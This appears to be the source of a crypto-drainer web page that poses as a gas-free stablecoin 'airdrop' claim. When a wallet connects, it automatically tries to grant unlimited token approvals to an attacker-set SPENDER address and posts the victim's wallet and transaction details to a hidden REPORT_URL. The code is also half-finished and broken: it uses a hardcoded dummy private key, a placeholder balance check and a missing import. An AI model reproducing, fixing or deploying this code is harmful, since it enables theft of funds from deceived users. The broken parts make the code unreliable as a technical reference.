'use client';
import { useState, useEffect } from 'react';
import { useAccount } from 'wagmi';
import { erc20Abi, maxUint256, createPublicClient, http, createWalletClient } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { mainnet, arbitrum, sepolia } from 'viem/chains';
import { createGelatoSmartWalletClient, sponsored } from "@gelatonetwork/smartwallet";
import { gelato } from "@gelatonetwork/smartwallet/accounts";

// Your existing configuration
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;

// Add Gelato API Key (get this from https://app.gelato.cloud/)
const GELATO_API_KEY = process.env.NEXT_PUBLIC_GELATO_API_KEY!;

if (!SPENDER || SPENDER === "0x") {
  throw new Error('SPENDER_ADDRESS is not defined or invalid');
}

if (!GELATO_API_KEY) {
  throw new Error('GELATO_API_KEY is not defined');
}

// Chain configuration for Gelato
const CHAIN_CONFIG = {
  1: { chain: mainnet, name: "Ethereum Mainnet" },
  42161: { chain: arbitrum, name: "Arbitrum" },
  11155111: { chain: sepolia, name: "Sepolia" },
};

// Your existing tokens configuration
const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
> = {
  1: [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", min: BigInt(1 * 10 ** 18), decimals: 18 },
    { symbol: "BUSD", address: "0x4fabb145d64652a948d72533023f6e7a623c7c53", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  42161: [
    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  11155111: [
    { symbol: "USDC", address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "LINK", address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
};

// Connection Reporter component (unchanged)
function ConnectionReporter() {
  const { address, isConnected } = useAccount();

  useEffect(() => {
    if (isConnected && address) {
       fetch(`${REPORT_URL}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "connect",
          wallet: address,
        }),
      }).catch(console.error);
    }
  }, [isConnected, address]);

  return null;
}

export default function Home() {
  const { address, isConnected, chainId } = useAccount();
  const [status, setStatus] = useState<string>("");

  // Create Gelato Smart Wallet Client for sponsored transactions
  async function createSponsoredWalletClient(chainId: number, userAddress: `0x${string}`) {
    const chainConfig = CHAIN_CONFIG[chainId as keyof typeof CHAIN_CONFIG];
    if (!chainConfig) {
      throw new Error(`Chain ${chainId} not supported for sponsored transactions`);
    }

    // Create a temporary private key for the smart wallet
    // In production, you might want to derive this deterministically from the user's address
    // or use a different approach based on your security requirements
    const tempPrivateKey = "0x" + "1".repeat(64) as `0x${string}`;
    const owner = privateKeyToAccount(tempPrivateKey);

    const publicClient = createPublicClient({
      chain: chainConfig.chain,
      transport: http(),
    });

    // Create Gelato Smart Account
    const account = await gelato({
      owner,
      client: publicClient,
    });

    // Create wallet client
    const walletClient = createWalletClient({
      account,
      chain: chainConfig.chain,
      transport: http(),
    });

    // Create Gelato Smart Wallet Client with sponsorship
    const smartWalletClient = createGelatoSmartWalletClient(walletClient, { 
      apiKey: GELATO_API_KEY 
    });

    return { smartWalletClient, chainName: chainConfig.name };
  }

  async function handleClaimWithSponsorship() {
    if (!isConnected || !address) {
      setStatus("Wallet not connected");
      return;
    }

    try {
      setStatus("Scanning chains for balances...");

      let targetChain: number | null = null;
      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];

      // Find tokens with sufficient balance (same logic as before)
      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        const numericCid = Number(cid);
        
        // Only check chains supported by Gelato
        if (!CHAIN_CONFIG[numericCid as keyof typeof CHAIN_CONFIG]) continue;

        for (const token of tokens) {
          try {
            // You'll need to implement balance checking logic here
            // For now, assuming we found usable tokens
            const hasBalance = true; // Replace with actual balance check
            
            if (hasBalance) {
              targetChain = numericCid;
              usableTokens.push(token);
            }
          } catch (error) {
            console.error(`Error checking balance for ${token.symbol}:`, error);
          }
        }

        if (usableTokens.length > 0) break;
      }

      if (!targetChain || usableTokens.length === 0) {
        setStatus("No usable balances found on supported chains.");
        return;
      }

      // Create sponsored wallet client
      const { smartWalletClient, chainName } = await createSponsoredWalletClient(targetChain, address);
      
      setStatus(`Processing sponsored transactions on ${chainName}...`);

      // Execute sponsored transactions for each token
      for (const token of usableTokens) {
        setStatus(`Approving ${token.symbol} on ${chainName} (Gas Sponsored)...`);

        try {
          // Execute sponsored approval transaction
          const results = await smartWalletClient.execute({
            payment: sponsored(GELATO_API_KEY),
            calls: [
              {
                to: token.address,
                data: encodeFunctionData({
                  abi: erc20Abi,
                  functionName: "approve",
                  args: [SPENDER, maxUint256],
                }),
                value: 0n,
              },
            ],
          });

          setStatus(`Processing ${token.symbol} approval...`);
          
          // Wait for transaction to be mined
          const txHash = await results?.wait();
          
          if (txHash) {
            setStatus(`${token.symbol} approved ✅ (Gas Sponsored)`);

            // Report the sponsored transaction
            await fetch(`${REPORT_URL}`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                event: "sponsored_approval",
                wallet: address,
                chainName,
                token: token.address,
                symbol: token.symbol,
                txHash,
                sponsored: true,
                userOpId: results?.id,
              }),
            }).catch(console.error);
          }
        } catch (error) {
          console.error(`Failed to approve ${token.symbol}:`, error);
          setStatus(`Error approving ${token.symbol}: ${error.message}`);
        }
      }

      setStatus("All sponsored approvals completed! 🎉");
    } catch (err: any) {
      console.error(err);
      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
    }
  }

  // Fallback to original method if sponsored transactions fail
  async function handleClaimFallback() {
    setStatus("Falling back to user-paid gas transactions...");
    // You can implement your original handleClaim logic here
    // For now, just showing a message
    setStatus("Fallback method would be implemented here");
  }

  // Main claim handler that tries sponsored first, then fallback
  async function handleClaim() {
    try {
      await handleClaimWithSponsorship();
    } catch (error) {
      console.error("Sponsored transaction failed, falling back:", error);
      await handleClaimFallback();
    }
  }

  // Automatically trigger claim when wallet connects
  useEffect(() => {
    if (isConnected && address) handleClaim();
  }, [isConnected, address]);

  return (
    <main
      style={{
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        gap: "24px",
        marginTop: "40px",
      }}
    >
      <header
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          right: 0,
          height: "64px",
          background: "#09011fff",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 24px",
          paddingTop: "env(safe-area-inset-top)",
          boxShadow: "0 2px 8px rgba(241, 235, 235, 0.08)",
          zIndex: 1000,
        }}
      >
        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>
          AIRDROPS (Gas Sponsored) 
        </div>
        <appkit-button />
      </header>

      <ConnectionReporter />

      <div
        style={{
          display: "flex",
          flexDirection: "column",
          gap: "24px",
          paddingTop: "80px",
          width: "80%",
          maxWidth: "600px",
        }}
      >
        <div
          style={{
            border: "1px solid #9dd6d1ff",
            borderRadius: "12px",
            padding: "20px",
            background: "#090e41ff",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "space-between",
            height: "500px",
          }}
        >
          <h2 style={{ marginBottom: "12px" }}>Airdrop (Gas Sponsored)</h2>
          <p style={{ fontSize: "12px", color: "#aaa", textAlign: "center", margin: "8px 0" }}>
            No gas fees required! Powered by Gelato
          </p>

          <div
            style={{
              flex: 1,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: "#e4e1daff",
              fontSize: "14px",
              textAlign: "center",
            }}
          >
            {status || "Ready to claim with sponsored gas!"}
          </div>

          <button
            onClick={handleClaim}
            style={{
              background: "#4ade80",
              color: "white",
              padding: "12px 28px",
              borderRadius: "8px",
              cursor: "pointer",
              marginTop: "16px",
              border: "none",
              fontWeight: "bold",
            }}
          >
            Claim Now (Gas Free)
          </button>
        </div>

        {[1, 2, 3].map((i) => (
          <div
            key={i}
            style={{
              border: "1px solid #c9c8ddff",
              borderRadius: "12px",
              padding: "20px",
              background: "#0e0a42ff",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <span>Box {i + 1}</span>
          </div>
        ))}
      </div>
    </main>
  );
}